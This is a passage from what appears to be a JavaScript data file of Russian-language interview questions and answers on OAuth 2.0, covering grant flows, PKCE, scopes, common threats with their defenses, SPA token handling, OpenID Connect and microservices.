Connect)</li></ul><p><strong>Важные детали:</strong></p><ul><li>Authorization Server и Resource Server могут быть одним сервером</li><li>Но часто это разные компоненты для масштабируемости</li><li>Client регистрируется заранее, получает Client ID и Secret</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'архитектура', 'компоненты', 'взаимодействие']
  },

  {
    id: 73,
    question: "Опишите основные OAuth 2.0 flows и когда какой использовать",
    answer: "<p><strong>OAuth 2.0 определяет несколько flows (grant types)</strong> для разных типов приложений.</p><p><strong>1. Authorization Code Flow (рекомендуемый):</strong></p><p><strong>Для кого:</strong></p><ul><li>Серверные веб-приложения</li><li>Приложения которые могут хранить Client Secret</li><li>Самый безопасный flow</li></ul><p><strong>Как работает:</strong></p><ol><li>Redirect пользователя на Authorization Server</li><li>Пользователь логинится и даёт согласие</li><li>Redirect обратно с authorization code в URL</li><li>Сервер обменивает code на access token (с Client Secret)</li><li>Токен никогда не попадает в браузер</li></ol><p><strong>Параметры запроса:</strong></p><ul><li>response_type=code</li><li>client_id=...</li><li>redirect_uri=https://yourapp.com/callback</li><li>scope=read:email write:profile</li><li>state=random-string (CSRF защита)</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Access token не в браузере</li><li>✅ Можно получить refresh token</li><li>✅ Client Secret защищён на сервере</li></ul><p><strong>2. Authorization Code Flow + PKCE (для SPA и мобильных):</strong></p><p><strong>Для кого:</strong></p><ul><li>Single Page Applications</li><li>Мобильные приложения</li><li>Любые public clients (нет Client Secret)</li></ul><p><strong>Что добавляет PKCE (Proof Key for Code Exchange):</strong></p><ol><li>Client генерирует случайный code_verifier</li><li>Создаёт code_challenge = SHA256(code_verifier)</li><li>Отправляет code_challenge при /authorize</li><li>При обмене code отправляет code_verifier</li><li>Server проверяет что SHA256(code_verifier) = code_challenge</li></ol><p><strong>Зачем PKCE:</strong></p><ul><li>Защита от перехвата authorization code</li><li>Даже без Client Secret безопасно</li><li>Обязателен для public clients с OAuth 2.1</li></ul><p><strong>3. Implicit Flow (УСТАРЕЛ, не использовать):</strong></p><p><strong>Для кого:</strong></p><ul><li>Раньше для SPA</li><li>❌ Теперь заменён на Authorization Code + PKCE</li></ul><p><strong>Как работал:</strong></p><ul><li>Access token сразу в URL fragment (#token=...)</li><li>Без промежуточного code</li><li>response_type=token</li></ul><p><strong>Почему устарел:</strong></p><ul><li>❌ Token в URL истории браузера</li><li>❌ Нет refresh token</li><li>❌ Менее безопасен</li></ul><p><strong>4. Client Credentials Flow:</strong></p><p><strong>Для кого:</strong></p><ul><li>Machine-to-machine коммуникация</li><li>Серверные приложения без пользователя</li><li>Микросервисы</li></ul><p><strong>Как работает:</strong></p><ul><li>Client отправляет Client ID + Secret напрямую</li><li>Получает access token</li><li>Нет пользовательской авторизации</li></ul><p><strong>Пример запроса:</strong></p><ul><li>POST /token</li><li>grant_type=client_credentials</li><li>client_id=...</li><li>client_secret=...</li></ul><p><strong>Использование:</strong></p><ul><li>Cron задачи</li><li>Backend сервисы</li><li>CI/CD пайплайны</li></ul><p><strong>5. Resource Owner Password Credentials (не рекомендуется):</strong></p><p><strong>Для кого:</strong></p><ul><li>Только для полностью доверенных приложений</li><li>Legacy миграции</li></ul><p><strong>Как работает:</strong></p><ul><li>Пользователь вводит логин/пароль В приложение</li><li>Приложение отправляет credentials на сервер</li><li>Получает access token</li></ul><p><strong>Почему не рекомендуется:</strong></p><ul><li>❌ Нарушает принцип OAuth (не передавать пароли)</li><li>❌ Приложение видит credentials</li><li>❌ Использовать только если нет альтернатив</li></ul><p><strong>6. Device Authorization Flow:</strong></p><p><strong>Для кого:</strong></p><ul><li>Устройства с ограниченным вводом</li><li>Smart TV, игровые консоли</li><li>CLI инструменты</li></ul><p><strong>Как работает:</strong></p><ol><li>Устройство получает device code и user code</li><li>Показывает пользователю: \"Иди на example.com/device и введи ABC123\"</li><li>Пользователь вводит код на другом устройстве</li><li>Даёт согласие</li><li>Устройство polling /token пока не получит access token</li></ol><p><strong>Выбор flow — decision tree:</strong></p><ul><li>🤖 Machine-to-machine? → <strong>Client Credentials</strong></li><li>📺 Устройство без браузера? → <strong>Device Flow</strong></li><li>🖥️ Серверное приложение? → <strong>Authorization Code</strong></li><li>📱 SPA/мобильное? → <strong>Authorization Code + PKCE</strong></li><li>🔒 Полностью доверенное? → <strong>Password</strong> (но лучше избегать)</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Используйте Authorization Code для всех веб-приложений</li><li>✅ PKCE обязателен для public clients</li><li>✅ Избегайте Implicit Flow</li><li>✅ Client Credentials только для сервис-к-сервису</li><li>✅ state параметр для CSRF защиты</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'flows', 'grant types', 'PKCE', 'безопасность']
  },

  {
    id: 74,
    question: "Что такое scopes в OAuth и как они контролируют доступ?",
    answer: "<p><strong>Scopes (области доступа)</strong> — это механизм ограничения прав, которые получает приложение.</p><p><strong>Основная идея:</strong></p><ul><li>Принцип наименьших привилегий</li><li>Приложение запрашивает только необходимые права</li><li>Пользователь видит что именно разрешает</li><li>Можно отозвать конкретные scopes</li></ul><p><strong>Как выглядят scopes:</strong></p><p><strong>Google API:</strong></p><ul><li>https://www.googleapis.com/auth/calendar.readonly</li><li>https://www.googleapis.com/auth/gmail.send</li><li>https://www.googleapis.com/auth/userinfo.email</li></ul><p><strong>GitHub API:</strong></p><ul><li>repo — полный доступ к репозиториям</li><li>repo:status — доступ к commit статусам</li><li>user:email — доступ к email</li><li>read:user — чтение профиля</li></ul><p><strong>Общие паттерны именования:</strong></p><ul><li><strong>read:resource</strong> — чтение</li><li><strong>write:resource</strong> — запись</li><li><strong>delete:resource</strong> — удаление</li><li><strong>admin:resource</strong> — полный доступ</li></ul><p><strong>Как работает запрос scopes:</strong></p><p><strong>При инициации OAuth:</strong></p><ul><li>/authorize?scope=read:email write:calendar user:profile</li><li>Пользователь видит экран:</li><li>\"Приложение X запрашивает разрешение:\"</li><li>✓ Просмотр вашего email адреса</li><li>✓ Редактирование календаря</li><li>✓ Доступ к базовому профилю</li></ul><p><strong>В access token:</strong></p><ul><li>Токен содержит разрешённые scopes</li><li>{ scopes: ['read:email', 'write:calendar'] }</li><li>Resource Server проверяет наличие нужного scope</li></ul><p><strong>Проверка scopes на Resource Server:</strong></p><ul><li>GET /api/emails — требует scope 'read:email'</li><li>POST /api/calendar — требует scope 'write:calendar'</li><li>Если токен не содержит нужный scope → 403 Forbidden</li></ul><p><strong>Иерархия scopes:</strong></p><p><strong>Широкие vs узкие scopes:</strong></p><ul><li>repo — полный доступ ко всем репозиториям</li><li>repo:status — только статусы коммитов</li><li>public_repo — только публичные репозитории</li></ul><p><strong>Лучше запрашивать узкие:</strong></p><ul><li>✅ Пользователь больше доверяет</li><li>✅ Меньше риск при компрометации</li><li>✅ Проще пройти security review</li></ul><p><strong>Динамическое изменение scopes:</strong></p><p><strong>Incremental authorization:</strong></p><ul><li>Сначала запросить минимум: 'user:profile'</li><li>Позже, когда нужна новая функция: 'read:calendar'</li><li>Новый OAuth flow с дополнительными scopes</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Не пугать пользователя сразу всеми правами</li><li>✅ Запрашивать по мере необходимости</li><li>✅ Лучший UX</li></ul><p><strong>OpenID Connect scopes (для identity):</strong></p><ul><li><strong>openid</strong> — базовый, обязательный для OIDC</li><li><strong>profile</strong> — имя, фото, дата рождения</li><li><strong>email</strong> — email адрес</li><li><strong>address</strong> — физический адрес</li><li><strong>phone</strong> — номер телефона</li></ul><p><strong>Пример запроса OIDC:</strong></p><ul><li>scope=openid profile email</li><li>Получите ID Token с базовыми claims</li></ul><p><strong>Best Practices для scopes:</strong></p><p><strong>При разработке API:</strong></p><ul><li>✅ Гранулярность — много узких scopes лучше чем один широкий</li><li>✅ Понятные названия — пользователь должен понимать что разрешает</li><li>✅ Документация — объяснить каждый scope</li><li>✅ Иерархия — широкие scopes включают узкие</li></ul><p><strong>При использовании OAuth:</strong></p><ul><li>✅ Запрашивать только необходимое</li><li>✅ Incremental authorization для сложных приложений</li><li>✅ Объяснять зачем нужен каждый scope</li><li>✅ Позволить пользователю отклонить отдельные scopes</li></ul><p><strong>Типичные ошибки:</strong></p><ul><li>❌ Запрос всех доступных scopes \"на всякий случай\"</li><li>❌ Слишком широкие scopes (admin:all)</li><li>❌ Неясные названия scopes</li><li>❌ Не проверять scopes на Resource Server</li></ul><p><strong>Отзыв scopes:</strong></p><ul><li>Пользователь может отозвать конкретные scopes</li><li>Не весь токен, а только часть прав</li><li>Приложение должно gracefully handle потерю прав</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'scopes', 'разрешения', 'авторизация', 'безопасность']
  },

  {
    id: 75,
    question: "Как работает процесс аутентификации и авторизации с использованием OAuth?",
    answer: "<p><strong>Детальный процесс OAuth 2.0</strong> на примере Authorization Code Flow с реальными запросами.</p><p><strong>Подготовка — регистрация приложения:</strong></p><ol><li>Разработчик регистрирует приложение у провайдера</li><li>Получает Client ID (публичный идентификатор)</li><li>Получает Client Secret (приватный ключ)</li><li>Указывает Redirect URIs (разрешённые URLs для callback)</li></ol><p><strong>Пример регистрации:</strong></p><ul><li>Client ID: abc123xyz</li><li>Client Secret: secret_key_789</li><li>Redirect URI: https://yourapp.com/oauth/callback</li></ul><p><strong>Шаг 1 — Инициация OAuth flow:</strong></p><p><strong>Пользователь кликает \"Войти через Google\":</strong></p><ul><li>Приложение формирует authorization URL</li><li>Redirect пользователя на Authorization Server</li></ul><p><strong>Пример URL:</strong></p><ul><li>https://accounts.google.com/o/oauth2/v2/auth?</li><li>response_type=code</li><li>&client_id=abc123xyz</li><li>&redirect_uri=https://yourapp.com/oauth/callback</li><li>&scope=openid email profile</li><li>&state=random_csrf_token_12345</li></ul><p><strong>Параметры:</strong></p><ul><li><strong>response_type=code</strong> — запрашиваем authorization code</li><li><strong>client_id</strong> — кто мы</li><li><strong>redirect_uri</strong> — куда вернуть пользователя</li><li><strong>scope</strong> — что запрашиваем</li><li><strong>state</strong> — защита от CSRF</li></ul><p><strong>Шаг 2 — Аутентификация пользователя:</strong></p><ol><li>Пользователь попадает на Authorization Server</li><li>Если не залогинен — вводит логин/пароль</li><li>Если уже залогинен — сразу consent screen</li></ol><p><strong>Шаг 3 — Consent Screen (экран согласия):</strong></p><p><strong>Пользователь видит:</strong></p><ul><li>\"Приложение YourApp хочет:\"</li><li>✓ Просмотр вашего email адреса</li><li>✓ Доступ к базовому профилю</li><li>[Разрешить] [Отменить]</li></ul><p><strong>Детали consent:</strong></p><ul><li>Показывается только при первой авторизации</li><li>Или при запросе новых scopes</li><li>Пользователь может отклонить</li></ul><p><strong>Шаг 4 — Redirect с authorization code:</strong></p><p><strong>После согласия пользователя:</strong></p><ul><li>Authorization Server создаёт authorization code</li><li>Redirect обратно на приложение</li></ul><p><strong>Пример redirect:</strong></p><ul><li>https://yourapp.com/oauth/callback?</li><li>code=AUTH_CODE_xyz789</li><li>&state=random_csrf_token_12345</li></ul><p><strong>Важно:</strong></p><ul><li>✅ Проверить state совпадает с отправленным (CSRF защита)</li><li>Authorization code — одноразовый, истекает быстро (10 минут)</li></ul><p><strong>Шаг 5 — Обмен code на access token:</strong></p><p><strong>Сервер приложения делает POST запрос:</strong></p><ul><li>POST https://oauth2.googleapis.com/token</li><li>Content-Type: application/x-www-form-urlencoded</li><li>Body:</li><li>grant_type=authorization_code</li><li>&code=AUTH_CODE_xyz789</li><li>&client_id=abc123xyz</li><li>&client_secret=secret_key_789</li><li>&redirect_uri=https://yourapp.com/oauth/callback</li></ul><p><strong>Почему на сервере:</strong></p><ul><li>Client Secret не должен попасть в браузер</li><li>Обмен происходит напрямую между серверами</li><li>Безопасная коммуникация</li></ul><p><strong>Шаг 6 — Получение токенов:</strong></p><p><strong>Response от Authorization Server:</strong></p><ul><li>{ \"access_token\": \"ya29.a0AfH6SMC...\", \"token_type\": \"Bearer\", \"expires_in\": 3600, \"refresh_token\": \"1//0gTN...\", \"scope\": \"openid email profile\", \"id_token\": \"eyJhbGciOiJSUzI1NiIs...\" }</li></ul><p><strong>Что получили:</strong></p><ul><li><strong>access_token</strong> — для API запросов</li><li><strong>refresh_token</strong> — для обновления access token</li><li><strong>id_token</strong> — информация о пользователе (OIDC)</li><li><strong>expires_in</strong> — сколько секунд валиден access token</li></ul><p><strong>Шаг 7 — Использование access token:</strong></p><p><strong>Запрос к Resource Server (API):</strong></p><ul><li>GET https://www.googleapis.com/oauth2/v2/userinfo</li><li>Authorization: Bearer ya29.a0AfH6SMC...</li></ul><p><strong>Response с данными:</strong></p><ul><li>{ \"id\": \"123456789\", \"email\": \"user@example.com\", \"verified_email\": true, \"name\": \"John Doe\", \"picture\": \"https://...\" }</li></ul><p><strong>Шаг 8 — Обновление access token (когда истёк):</strong></p><p><strong>POST запрос с refresh token:</strong></p><ul><li>POST https://oauth2.googleapis.com/token</li><li>grant_type=refresh_token</li><li>&refresh_token=1//0gTN...</li><li>&client_id=abc123xyz</li><li>&client_secret=secret_key_789</li></ul><p><strong>Получаем новый access token:</strong></p><ul><li>{ \"access_token\": \"ya29.new_token...\", \"expires_in\": 3600, \"token_type\": \"Bearer\" }</li></ul><p><strong>Различие аутентификации и авторизации в OAuth:</strong></p><p><strong>Аутентификация (кто ты):</strong></p><ul><li>Происходит на Authorization Server</li><li>Пользователь вводит логин/пароль</li><li>Результат — ID Token (в OIDC)</li></ul><p><strong>Авторизация (что можешь):</strong></p><ul><li>Выбор scopes</li><li>Consent screen</li><li>Результат — Access Token с определёнными правами</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'процесс авторизации', 'flow', 'токены', 'API']
  },

  {
    id: 76,
    question: "Какие угрозы безопасности существуют в OAuth и как их предотвратить?",
    answer: "<p><strong>OAuth имеет специфичные уязвимости</strong>, требующие правильной реализации для защиты.</p><p><strong>1. Authorization Code Interception:</strong></p><p><strong>Атака:</strong></p><ul><li>Злонамеренное приложение перехватывает authorization code</li><li>Использует его для получения access token</li><li>Получает доступ к ресурсам жертвы</li></ul><p><strong>Сценарий на мобильных:</strong></p><ul><li>Два приложения регистрируют один redirect URI</li><li>Malicious app перехватывает callback</li></ul><p><strong>Защита:</strong></p><ul><li>✅ <strong>PKCE</strong> (обязателен для public clients)</li><li>✅ Custom URI schemes с app links verification</li><li>✅ State parameter для валидации</li><li>✅ Короткое время жизни authorization code</li></ul><p><strong>2. CSRF на Redirect URI:</strong></p><p><strong>Атака:</strong></p><ul><li>Злонамеленник инициирует OAuth flow</li><li>Получает authorization code для своего аккаунта</li><li>Подменяет redirect жертве</li><li>Жертва привязывает свой аккаунт к аккаунту злонамеленника</li></ul><p><strong>Защита:</strong></p><ul><li>✅ <strong>state parameter</strong> — случайное значение</li><li>✅ Проверка state при callback</li><li>✅ Привязка state к сессии пользователя</li></ul><p><strong>Пример:</strong></p><ul><li>Генерация: state = crypto.randomBytes(32).toString('hex')</li><li>Хранение: session.oauthState = state</li><li>Проверка: if (req.query.state !== session.oauthState) reject()</li></ul><p><strong>3. Open Redirect:</strong></p><p><strong>Атака:</strong></p><ul><li>Злонамеренник подменяет redirect_uri</li><li>Authorization code отправляется на злонамеленный сервер</li></ul><p><strong>Защита:</strong></p><ul><li>✅ <strong>Whitelist redirect URIs</strong> при регистрации</li><li>✅ Точное совпадение (не prefix matching)</li><li>✅ Валидация на Authorization Server</li><li>✅ Избегать wildcard URIs</li></ul><p><strong>4. Client Impersonation:</strong></p><p><strong>Атака:</strong></p><ul><li>Злонамеленное приложение использует чужой Client ID</li><li>Притворяется легитимным приложением</li><li>Redirect на свой URI</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Строгая валидация redirect_uri + client_id пары</li><li>✅ PKCE для public clients</li><li>✅ Client authentication для confidential clients</li></ul><p><strong>5. Token Leakage:</strong></p><p><strong>Через браузер history:</strong></p><ul><li>Implicit Flow — токен в URL fragment</li><li>❌ Не использовать Implicit Flow</li><li>✅ Authorization Code + PKCE</li></ul><p><strong>Через логи:</strong></p><ul><li>Access token в URL параметрах</li><li>✅ Только в Authorization заголовке</li><li>✅ Фильтровать токены в логах</li></ul><p><strong>Через Referer:</strong></p><ul><li>Токен утекает через Referer header</li><li>✅ Referrer-Policy: no-referrer для страниц с токенами</li></ul><p><strong>6. Недостаточная валидация scopes:</strong></p><p><strong>Атака:</strong></p><ul><li>Приложение запрашивает широкие scopes</li><li>Использует для непредназначенных целей</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Запрашивать минимальные scopes</li><li>✅ Resource Server проверяет наличие нужных scopes</li><li>✅ Пользователь должен понимать что разрешает</li></ul><p><strong>7. Token Replay Attack:</strong></p><p><strong>Атака:</strong></p><ul><li>Перехваченный токен переиспользуется</li><li>До истечения срока действия</li></ul><p><strong>Защита:</strong></p><ul><li>✅ HTTPS everywhere</li><li>✅ Короткий expires_in для access token</li><li>✅ Token binding (привязка к TLS session)</li><li>✅ Sender-Constrained tokens (DPoP)</li></ul><p><strong>8. Refresh Token Theft:</strong></p><p><strong>Атака:</strong></p><ul><li>Украденный refresh token используется долго</li><li>Создаются новые access tokens</li></ul><p><strong>Защита:</strong></p><ul><li>✅ <strong>Refresh Token Rotation</strong> — новый при каждом использовании</li><li>✅ Reuse Detection — отзыв всех токенов при повторном использовании</li><li>✅ Хранение refresh tokens в БД</li><li>✅ Привязка к устройству/IP</li></ul><p><strong>9. Фишинг через поддельный Authorization Server:</strong></p><p><strong>Атака:</strong></p><ul><li>Поддельная страница авторизации</li><li>Пользователь вводит credentials</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Проверять HTTPS и домен перед вводом пароля</li><li>✅ Использовать проверенные OAuth провайдеры</li><li>✅ Обучение пользователей</li></ul><p><strong>10. Недостаточная проверка токена на Resource Server:</strong></p><p><strong>Проблемы:</strong></p><ul><li>Не проверяется подпись</li><li>Не проверяется expiration</li><li>Не проверяются scopes</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Полная валидация токена</li><li>✅ Проверка подписи (JWT)</li><li>✅ Проверка exp, aud, iss</li><li>✅ Проверка scopes для каждого endpoint</li></ul><p><strong>Best Practices безопасности:</strong></p><ul><li>✅ PKCE для всех типов клиентов</li><li>✅ state parameter обязательно</li><li>✅ Whitelist redirect URIs</li><li>✅ HTTPS everywhere</li><li>✅ Короткие access tokens (15 минут)</li><li>✅ Refresh token rotation</li><li>✅ Валидация на каждом этапе</li><li>✅ Логирование подозрительной активности</li><li>✅ Rate limiting</li><li>✅ Security headers (CSP, HSTS)</li></ul>",
    difficulty: 'senior',
    tags: ['OAuth', 'безопасность', 'уязвимости', 'PKCE', 'защита']
  },

  {
    id: 77,
    question: "Как реализовать OAuth 2.0 в Single Page Application (SPA)?",
    answer: "<p><strong>SPA требует особого подхода к OAuth</strong> из-за отсутствия backend и невозможности хранить секреты.</p><p><strong>Проблемы SPA с OAuth:</strong></p><ul><li>❌ Нет backend для хранения Client Secret</li><li>❌ Весь код виден в браузере</li><li>❌ XSS может украсть токены из JavaScript</li><li>❌ Невозможно безопасно хранить долгоживущие токены</li></ul><p><strong>Рекомендуемый подход — Authorization Code + PKCE:</strong></p><p><strong>Шаг 1 — Генерация PKCE параметров:</strong></p><ul><li>// Генерация code_verifier</li><li>const codeVerifier = base64URLEncode(crypto.randomBytes(32));</li><li>// Создание code_challenge</li><li>const codeChallenge = base64URLEncode(sha256(codeVerifier));</li><li>// Сохранить verifier в sessionStorage</li><li>sessionStorage.setItem('pkce_verifier', codeVerifier);</li></ul><p><strong>Шаг 2 — Redirect на Authorization:</strong></p><ul><li>const authUrl = `https://auth.provider.com/authorize?` +</li><li>`response_type=code&` +</li><li>`client_id=${CLIENT_ID}&` +</li><li>`redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +</li><li>`scope=openid profile email&` +</li><li>`state=${randomState}&` +</li><li>`code_challenge=${codeChallenge}&` +</li><li>`code_challenge_method=S256`;</li><li>window.location.href = authUrl;</li></ul><p><strong>Шаг 3 — Обработка callback:</strong></p><ul><li>// Извлечь code и state из URL</li><li>const params = new URLSearchParams(window.location.search);</li><li>const code = params.get('code');</li><li>const state = params.get('state');</li><li>// Проверить state</li><li>if (state !== sessionStorage.getItem('oauth_state')) throw Error();</li></ul><p><strong>Шаг 4 — Обмен code на токен (БЕЗ Client Secret):</strong></p><ul><li>const codeVerifier = sessionStorage.getItem('pkce_verifier');</li><li>const response = await fetch('https://auth.provider.com/token', {</li><li>method: 'POST',</li><li>headers: { 'Content-Type': 'application/x-www-form-urlencoded' },</li><li>body: new URLSearchParams({</li><li>grant_type: 'authorization_code',</li><li>code: code,</li><li>redirect_uri: REDIRECT_URI,</li><li>client_id: CLIENT_ID,</li><li>code_verifier: codeVerifier // PKCE вместо Client Secret</li><li>})</li><li>});</li><li>const tokens = await response.json();</li></ul><p><strong>Хранение токенов в SPA:</strong></p><p><strong>Варианты и компромиссы:</strong></p><table><tr><th>Способ</th><th>XSS риск</th><th>Рекомендация</th></tr><tr><td>В памяти (переменная)</td><td>⚠️ Средний</td><td>✅ Лучший вариант</td></tr><tr><td>sessionStorage</td><td>❌ Высокий</td><td>⚠️ Приемлемо</td></tr><tr><td>localStorage</td><td>❌ Очень высокий</td><td>❌ Избегать</td></tr></table><p><strong>Рекомендуемый паттерн — в памяти:</strong></p><ul><li>// Глобальная переменная или состояние</li><li>let accessToken = null;</li><li>let tokenExpiry = null;</li><li>// При получении токена</li><li>accessToken = tokens.access_token;</li><li>tokenExpiry = Date.now() + (tokens.expires_in * 1000);</li><li>// При перезагрузке страницы токен теряется</li><li>// Нужен механизм восстановления</li></ul><p><strong>Паттерн с Backend-for-Frontend (BFF):</strong></p><p><strong>Архитектура:</strong></p><ul><li>SPA общается с собственным backend</li><li>Backend хранит токены в HttpOnly cookies</li><li>Backend проксирует запросы к API</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Токены не в JavaScript</li><li>✅ HttpOnly cookies — защита от XSS</li><li>✅ Refresh token на backend</li><li>✅ Можно хранить Client Secret</li></ul><p><strong>Flow:</strong></p><ol><li>SPA → BFF: инициация OAuth</li><li>BFF → Auth Server: полный OAuth flow</li><li>BFF ← tokens</li><li>BFF сохраняет в session, возвращает session cookie</li><li>SPA → BFF: API запросы с session cookie</li><li>BFF → Resource Server: запросы с access token</li></ol><p><strong>Обработка истечения access token:</strong></p><ul><li>// Проверка перед каждым запросом</li><li>if (Date.now() >= tokenExpiry) {</li><li>// Попытка refresh</li><li>await refreshAccessToken();</li><li>}</li><li>// HTTP interceptor для 401</li><li>axios.interceptors.response.use(</li><li>response => response,</li><li>async error => {</li><li>if (error.response?.status === 401) {</li><li>await refreshAccessToken();</li><li>// Retry оригинальный запрос</li><li>return axios.request(error.config);</li><li>}</li><li>return Promise.reject(error);</li><li>}</li><li>);</li></ul><p><strong>Silent Authentication (восстановление сессии):</strong></p><ul><li>// Скрытый iframe для проверки сессии</li><li>const iframe = document.createElement('iframe');</li><li>iframe.style.display = 'none';</li><li>iframe.src = authUrl + '&prompt=none'; // Без UI</li><li>// Если пользователь залогинен — получим code</li><li>// Если нет — error=login_required</li></ul><p><strong>Best Practices для SPA:</strong></p><ul><li>✅ Authorization Code + PKCE обязательно</li><li>✅ Токены в памяти или с BFF подходом</li><li>✅ Короткий expires_in (5-15 минут)</li><li>✅ CSP для защиты от XSS</li><li>✅ HTTPS only</li><li>✅ state для CSRF защиты</li><li>✅ Silent authentication для UX</li><li>❌ Никогда localStorage для критичных токенов</li><li>❌ Никогда Implicit Flow</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'SPA', 'PKCE', 'безопасность', 'frontend']
  },

  {
    id: 78,
    question: "Что такое OpenID Connect и чем он отличается от OAuth 2.0?",
    answer: "<p><strong>OpenID Connect (OIDC)</strong> — это протокол аутентификации, построенный поверх OAuth 2.0.</p><p><strong>Ключевое различие:</strong></p><ul><li><strong>OAuth 2.0</strong> — протокол авторизации (\"что можешь делать\")</li><li><strong>OIDC</strong> — протокол аутентификации (\"кто ты\")</li></ul><p><strong>Что OAuth 2.0 НЕ решает:</strong></p><ul><li>❌ Не стандартизирует формат токенов</li><li>❌ Не говорит как получить информацию о пользователе</li><li>❌ Не определяет identity claims</li><li>❌ Каждый провайдер делает по-своему</li></ul><p><strong>Что добавляет OIDC:</strong></p><p><strong>1. ID Token (основное нововведение):</strong></p><ul><li>Стандартизированный JWT токен</li><li>Содержит информацию о пользователе (identity claims)</li><li>Подписан провайдером</li><li>Для клиентского приложения, не для API</li></ul><p><strong>Структура ID Token:</strong></p><ul><li>{ \"iss\": \"https://accounts.google.com\", \"sub\": \"10769150350006150715113082367\", \"aud\": \"your-client-id\", \"exp\": 1311281970, \"iat\": 1311280970, \"name\": \"John Doe\", \"email\": \"john@example.com\", \"email_verified\": true, \"picture\": \"https://...\" }</li></ul><p><strong>Стандартные claims:</strong></p><ul><li><strong>sub</strong> — уникальный ID пользователя (subject)</li><li><strong>name</strong> — полное имя</li><li><strong>given_name</strong> — имя</li><li><strong>family_name</strong> — фамилия</li><li><strong>email</strong> — email адрес</li><li><strong>email_verified</strong> — подтверждён ли email</li><li><strong>picture</strong> — URL аватара</li><li><strong>locale</strong> — язык пользователя</li></ul><p><strong>2. UserInfo Endpoint:</strong></p><ul><li>Стандартный endpoint для получения полного профиля</li><li>GET /userinfo + Authorization: Bearer {access_token}</li><li>Возвращает те же claims что в ID Token + дополнительные</li></ul><p><strong>3. Стандартные scopes для identity:</strong></p><ul><li><strong>openid</strong> — обязательный scope, включает OIDC</li><li><strong>profile</strong> — базовая информация (name, picture и т.д.)</li><li><strong>email</strong> — email и email_verified</li><li><strong>address</strong> — физический адрес</li><li><strong>phone</strong> — номер телефона</li></ul><p><strong>4. Стандартизированные endpoints:</strong></p><ul><li>/.well-known/openid-configuration — Discovery endpoint</li><li>Описывает все capabilities провайдера</li><li>URLs для authorization, token, userinfo</li><li>Поддерживаемые scopes, grant types</li></ul><p><strong>OIDC Flow (поверх Authorization Code):</strong></p><ol><li>Запрос с scope=openid profile email</li><li>Пользователь аутентифицируется</li><li>Получаем authorization code</li><li>Обмен code на токены:</li><li>← access_token (для API)</li><li>← id_token (информация о пользователе)</li><li>← refresh_token (опционально)</li><li>Клиент верифицирует ID Token</li><li>Извлекает claims о пользователе</li></ol><p><strong>Валидация ID Token:</strong></p><ul><li>✅ Проверить подпись (JWS)</li><li>✅ Проверить iss (issuer) — правильный провайдер</li><li>✅ Проверить aud (audience) — ваш client_id</li><li>✅ Проверить exp — не истёк</li><li>✅ Проверить nonce (если использовался)</li></ul><p><strong>Разница между ID Token и Access Token:</strong></p><table><tr><th>Аспект</th><th>ID Token</th><th>Access Token</th></tr><tr><td>Назначение</td><td>Identity пользователя</td><td>Доступ к API</td></tr><tr><td>Для кого</td><td>Client приложение</td><td>Resource Server</td></tr><tr><td>Формат</td><td>Всегда JWT</td><td>Любой (opaque или JWT)</td></tr><tr><td>Содержимое</td><td>User claims</td><td>Scopes, permissions</td></tr><tr><td>Использование</td><td>Прочитать и всё</td><td>Отправлять с запросами</td></tr></table><p><strong>Когда использовать OIDC vs чистый OAuth:</strong></p><p><strong>Используйте OIDC когда:</strong></p><ul><li>✅ Нужна аутентификация (\"войти через...\")</li><li>✅ Нужна информация о пользователе</li><li>✅ Single Sign-On (SSO)</li><li>✅ Стандартизированный подход к identity</li></ul><p><strong>Используйте чистый OAuth когда:</strong></p><ul><li>✅ Только авторизация (доступ к API)</li><li>✅ Не нужна информация о пользователе</li><li>✅ Machine-to-machine коммуникация</li></ul><p><strong>Практический пример — \"Войти через Google\":</strong></p><ul><li>// Это OIDC, не чистый OAuth</li><li>scope=openid email profile</li><li>// Получаем ID Token</li><li>const idToken = jwt.decode(tokens.id_token);</li><li>const user = {</li><li>id: idToken.sub,</li><li>email: idToken.email,</li><li>name: idToken.name,</li><li>picture: idToken.picture</li><li>};</li><li>// Создаём локальную сессию</li><li>session.user = user;</li></ul><p><strong>Discovery и динамическая конфигурация:</strong></p><ul><li>const config = await fetch('https://accounts.google.com/.well-known/openid-configuration');</li><li>// Получаем все endpoints автоматически</li><li>const { authorization_endpoint, token_endpoint, userinfo_endpoint } = await config.json();</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Используйте OIDC для аутентификации пользователей</li><li>✅ Валидируйте ID Token полностью</li><li>✅ Не используйте ID Token для доступа к API</li><li>✅ Access Token для API, ID Token для профиля</li><li>✅ Discovery endpoint для конфигурации</li></ul>",
    difficulty: 'middle',
    tags: ['OpenID Connect', 'OIDC', 'OAuth', 'аутентификация', 'ID Token']
  },

  {
    id: 79,
    question: "Как OAuth используется в микросервисной архитектуре и API Gateway?",
    answer: "<p><strong>OAuth в микросервисах</strong> решает задачи распределённой авторизации и делегирования доступа.</p><p><strong>Типичная архитектура:</strong></p><ul><li>🔐 <strong>Identity Provider / Auth Service</strong> — выдаёт токены</li><li>🌐 <strong>API Gateway</strong> — входная точка, первичная проверка</li><li>⚙️ <strong>Микросервисы</strong> — бизнес-логика, вторичная проверка</li></ul><p><strong>Паттерн 1 — Gateway Authentication:</strong></p><p><strong>Архитектура:</strong></p><ol><li>Client получает access token от Auth Service</li><li>Отправляет запрос на API Gateway</li><li>Gateway проверяет токен</li><li>Извлекает user context (userId, roles, scopes)</li><li>Пробрасывает в микросервисы через headers</li><li>Микросервисы доверяют Gateway</li></ol><p><strong>Преимущества:</strong></p><ul><li>✅ Централизованная аутентификация</li><li>✅ Микросервисы не думают об OAuth</li><li>✅ Единая точка для security policies</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Gateway — критичный компонент</li><li>❌ Нужна защита внутренних headers</li></ul><p><strong>Реализация в 